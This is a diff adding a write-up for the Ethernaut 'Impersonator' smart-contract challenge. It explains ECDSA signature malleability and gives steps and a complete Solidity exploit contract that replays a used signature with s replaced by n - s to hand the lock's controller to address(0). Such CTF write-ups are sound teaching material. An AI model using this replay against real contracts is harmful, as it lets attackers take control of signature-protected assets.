@@ -1983,3 +1983,141 @@ await contract.commander(); // returns your address
 
 ### Level Completed
 ![Level Complete Output](assets/Higherorder.png)
+
+
+Here’s the updated explanation with the new details included, formatted as you requested:
+
+---
+
+# Ethernaut Level: **Impersonator**
+
+---
+
+### Strategy
+
+The goal is to **bypass ECDSA signature validation** and set the controller of the lock to anyone you want (e.g., `address(0)`), effectively compromising the lock system and allowing *anyone* to open the door.
+
+This challenge is based on the **vulnerability in ECDSA signature malleability**: for every valid `(r, s)` signature, there is another valid `(r, -s mod n)` signature that verifies to the same signer. If the signature validation doesn’t enforce `s` to be in the lower half of the secp256k1 curve order, it can be abused to replay previously used signatures with `new_s`, thus bypassing the `usedSignatures` check.
+
+---
+
+### Vulnerability Summary
+
+```solidity
+// s malleability not handled
+function _isValidSignature(uint8 v, bytes32 r, bytes32 s) internal returns (address) {
+    address _address = ecrecover(msgHash, v, r, s);
+    require (_address == controller, InvalidController());
+
+    bytes32 signatureHash = keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]));
+    require (!usedSignatures[signatureHash], SignatureAlreadyUsed());
+
+    usedSignatures[signatureHash] = true;
+
+    return _address;
+}
+```
+
+- The system **does not enforce low `s` values**, allowing **signature malleability** via `s' = n - s`.
+- The **signature hash is based on (r, s, v)**. If we pass a valid but unused `(r, n - s)` with the same `v`, `ecrecover` still returns the correct controller.
+- This allows **reusing already-used signatures** under a different `s`.
+
+---
+
+### Exploit Steps
+
+#### 1. **Retrieve ECLocker Address**
+
+To exploit the `Impersonator` contract, we first need to retrieve the **ECLocker** contract's address.
+
+- After calling `deployNewLock()` in the `Impersonator` contract, you can **find the address of the `ECLocker`** on **Etherscan** by going to the **Logs** tab of the transaction.
+
+- The `Impersonator` contract emits a **NewLock** event with the address of the deployed `ECLocker`. This event has the following signature:
+  ```solidity
+  event NewLock(address locker);
+  ```
+
+- In the logs, under **Topic 1**, you'll find the address of the deployed `ECLocker`.
+
+For example, after deploying, you will see logs like:
+```plaintext
+topic[0]: 0x5c752bb3236b1cbcab285e75919a922aa3ab2723
+topic[1]: 0x6f79f29ac0f241abbde3b5fa17a8abf56419e9c4
+```
+Here, the **ECLocker** contract's address is `0x6f79f29ac0f241abbde3b5fa17a8abf56419e9c4`, which you will use in the next step.
+
+#### 2. Gather a known valid `(r, s, v)` signature
+
+This can be derived from a real controller transaction or found in the deployed instance.
+
+```js
+// Given values (example)
+v = 28;
+r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
+s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;
+```
+
+#### 3. Compute `new_s = n - s`
+
+Use secp256k1 curve order:
+
+```solidity
+n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
+new_s = n - s;
+```
+
+#### 4. Call `changeController` using the `(r, new_s, v)` signature
+
+```solidity
+locker.changeController(v, r, bytes32(new_s), address(0));
+```
+
+This sets `controller = address(0)` (i.e., no controller).
+
+#### 5. Open the lock as any address
+
+Once `controller == address(0)`, anyone can pass the same (r, new_s, v) signature to call:
+
+```solidity
+locker.open(v, r, bytes32(new_s)); // succeeds for any sender!
+```
+
+---
+
+### Exploit Contract
+
+```solidity
+contract Solution {
+    ECLocker public locker;
+
+    constructor(address _lockerAddress) {
+        locker = ECLocker(_lockerAddress);
+    }
+
+    function run() public {
+        uint8 v = 28;
+        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
+        bytes32 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;
+        
+        // Curve order of secp256k1
+        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
+        uint256 new_s = n - uint256(s);
+
+        locker.changeController(v, r, bytes32(new_s), address(0));
+    }
+}
+```
+
+---
+
+### Remix Deployment
+
+1. Deploy the `Solution` contract with the target ECLocker address.
+2. Call `run()`.
+3. Submit the instance after seeing success status on Etherscan.
+
+---
+
+### Level Completed
+![Level Complete Output](assets/Impersonator.png)
+![2](assets/Impersonatorscan.png)
